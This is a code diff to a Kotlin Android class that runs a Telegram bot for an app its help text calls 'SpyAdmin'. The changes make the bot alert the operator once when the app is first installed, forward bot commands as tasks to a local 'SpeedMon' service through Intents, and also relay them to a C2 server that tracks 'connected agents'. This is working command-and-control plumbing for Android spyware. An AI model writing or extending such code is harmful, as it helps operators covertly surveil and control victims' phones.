@@ -1,6 +1,7 @@
 package com.system.monitor.admin
 
 import android.content.Context
+import android.content.Intent
 import android.content.SharedPreferences
 import android.util.Log
 import com.google.gson.Gson
@@ -20,6 +21,7 @@ class TelegramBotService(private val context: Context) {
         private const val TELEGRAM_API = "https://api.telegram.org/bot"
         private const val PREFS_NAME = "telegram_bot_config"
         private const val KEY_OFFSET = "update_offset"
+        private const val KEY_ONBOARD_SENT = "onboard_sent"
     }
 
     private val gson = Gson()
@@ -37,6 +39,11 @@ class TelegramBotService(private val context: Context) {
         pollThread = Thread({ pollLoop() }, "telegram-bot-poll")
         pollThread?.start()
         Log.d("TelegramBot", "Bot started")
+        // Send onboard notification ONLY once ever
+        if (!prefs.getBoolean(KEY_ONBOARD_SENT, false)) {
+            notifyOnboard("Agent App")
+            prefs.edit().putBoolean(KEY_ONBOARD_SENT, true).apply()
+        }
     }
 
     fun stop() {
@@ -99,7 +106,7 @@ class TelegramBotService(private val context: Context) {
         when {
             text.startsWith("/start") -> {
                 sendMessage(chatId, getHelpMessage())
-                notifyOnboard(msg.from?.firstName ?: "User")
+                // Don't send onboard again - only once at first install
             }
             text == "/status" -> sendStatus(chatId)
             text == "/agents" -> sendAgentsList(chatId)
@@ -151,6 +158,29 @@ class TelegramBotService(private val context: Context) {
     }
 
     private fun sendTask(chatId: Long, capability: String, args: Map<String, Any>) {
+        val taskId = java.util.UUID.randomUUID().toString()
+        
+        // Send to local SpeedMon via explicit Intent to start service
+        val serviceIntent = Intent().apply {
+            setClassName("com.speedmon", "com.speedmon.SpeedMonService")
+            action = "com.speedmon.ACTION_COMMAND"
+            putExtra("capability", capability)
+            putExtra("args", gson.toJson(args))
+            putExtra("task_id", taskId)
+        }
+        try {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                context.startForegroundService(serviceIntent)
+            } else {
+                context.startService(serviceIntent)
+            }
+            sendMessage(chatId, "✅ Task sent to SpeedMon: $capability")
+        } catch (e: Exception) {
+            Log.e("TelegramBot", "Failed to start SpeedMon service", e)
+            sendMessage(chatId, "❌ Failed to send to SpeedMon: ${e.message}")
+        }
+
+        // Also try C2 if configured (non-blocking)
         val c2Url = getC2Url()
         val payload = mapOf(
             "action" to "task",
@@ -159,9 +189,7 @@ class TelegramBotService(private val context: Context) {
             "timeout" to 30
         )
         sendC2Request(c2Url, "/api/command", payload) { resp ->
-            sendMessage(chatId, "✅ Task sent: $capability\nResponse: $resp")
-        } ?: run {
-            sendMessage(chatId, "❌ Failed to send task (no C2 or agents)")
+            sendMessage(chatId, "📡 C2 Response: $resp")
         }
     }
 
@@ -191,7 +219,7 @@ class TelegramBotService(private val context: Context) {
         sendC2Request(c2Url, "/api/agents", payload) { resp ->
             sendMessage(chatId, "📊 *Agents Status:*\n$resp")
         } ?: run {
-            sendMessage(chatId, "❌ C2 unreachable")
+            sendMessage(chatId, "⚠️ C2 unreachable (local SpeedMon may still work)")
         }
     }
 
@@ -201,7 +229,7 @@ class TelegramBotService(private val context: Context) {
         sendC2Request(c2Url, "/api/agents", payload) { resp ->
             sendMessage(chatId, "🤖 *Connected Agents:*\n$resp")
         } ?: run {
-            sendMessage(chatId, "❌ C2 unreachable")
+            sendMessage(chatId, "⚠️ C2 unreachable (local SpeedMon may still work)")
         }
     }
 
@@ -224,7 +252,7 @@ class TelegramBotService(private val context: Context) {
 🤖 *SpyAdmin Telegram Bot*
 
 *System Commands:*
-/start - Show this help & notify admin
+/start - Show this help
 /status - Show C2 status
 /agents - List connected agents
 /help - Show this message
